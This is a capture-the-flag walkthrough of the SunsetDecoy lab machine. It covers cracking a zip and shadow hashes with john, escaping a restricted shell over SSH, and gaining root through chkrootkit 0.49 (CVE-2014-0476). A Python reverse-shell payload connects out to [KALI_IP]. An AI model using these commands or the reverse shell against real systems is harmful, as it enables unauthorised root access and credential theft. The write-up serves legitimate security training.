# SunsetDecoy: Machine Notes (PG-Play)

## Recon

### Nmap
- Port 22/tcp: SSH (OpenSSH 7.9p1)
- Port 80/tcp: HTTP (Apache 2.4.38)

### Web Enumeration
- Found `save.zip` in the web root.
- Download: `wget http://[IP]/save.zip`

## Initial Access

### Zip Password Cracking
- The ZIP is password protected.
```bash
zip2john save.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```
- ZIP Password: `manuel`

### Shadow File Cracking
- Extracting `save.zip` reveals `/etc/passwd` and `/etc/shadow`.
```bash
unshadow passwd shadow > shadow.hash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.hash
```
- User: `296640a3b825115a47b68fc44501c828`
- Password: `server`

### Restricted Shell Escape (rbash)
- Initial SSH puts user in `rbash`.
- Escape by specifying a shell during login:
```bash
ssh 296640a3b825115a47b68fc44501c828@[IP] -t "bash --noprofile"
```

## Privilege Escalation

### Local Enumeration
- Home directory contains `honeypot.decoy` binary. Running it and selecting option 5 ("Launch an AV Scan") triggers a background process.
- Using `pspy` reveals that root runs `chkrootkit-0.49` periodically.

### Chkrootkit 0.49 (CVE-2014-0476)
- This version of `chkrootkit` is vulnerable to local privilege escalation if it finds an executable at `/tmp/update`.
- Create the exploit payload:
```bash
echo '#!/bin/bash' > /tmp/update
echo 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[KALI_IP]\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"' >> /tmp/update
chmod +x /tmp/update
```
- Listen on Kali: `nc -lvp 4444`
- Wait for the cron job to trigger (up to 1 minute).
- Result: **Root shell**.
